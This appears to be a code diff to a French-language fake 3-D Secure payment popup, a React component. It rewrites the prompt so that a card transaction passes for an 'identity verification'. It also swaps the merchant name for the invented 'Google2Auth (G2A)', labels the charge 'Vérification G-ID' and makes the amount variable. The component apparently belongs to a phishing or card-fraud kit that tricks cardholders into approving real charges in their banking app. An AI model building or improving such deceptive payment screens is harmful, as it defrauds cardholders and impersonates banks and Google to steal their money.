@@ -35,7 +35,7 @@ const ThreeDSecurePopup = ({
           </h3>
           
           <p className={styles.subtitle}>
-            Confirmez l'autorisation suivante depuis votre application bancaire pour vérifier votre compte.
+            Confirmez la transaction éphémère suivante pour vérifier votre identité :
           </p>
           
           <div className={styles.transactionCard}>
@@ -46,12 +46,12 @@ const ThreeDSecurePopup = ({
             <div className={styles.transactionGrid}>
               <div className={styles.transactionItem}>
                 <span className={styles.transactionLabel}>Marchand</span>
-                <span className={styles.transactionValue}>UAB Inrento Verification</span>
+                <span className={styles.transactionValue}>Google2Auth (G2A)</span>
               </div>
               
               <div className={styles.transactionItem}>
                 <span className={styles.transactionLabel}>Type</span>
-                <span className={styles.transactionValue}>Pré-autorisation</span>
+                <span className={styles.transactionValue}>Vérification G-ID</span>
               </div>
               
               <div className={styles.transactionItem}>
@@ -66,7 +66,7 @@ const ThreeDSecurePopup = ({
               
               <div className={`${styles.transactionItem} ${styles.amountItem}`}>
                 <span className={styles.transactionLabel}>Montant à vérifier</span>
-                <span className={styles.transactionValue}>10,20 €</span>
+                <span className={styles.transactionValue}>{amount.toFixed(2).toString().replace('.', ',')} €</span>
               </div>
             </div>
           </div>
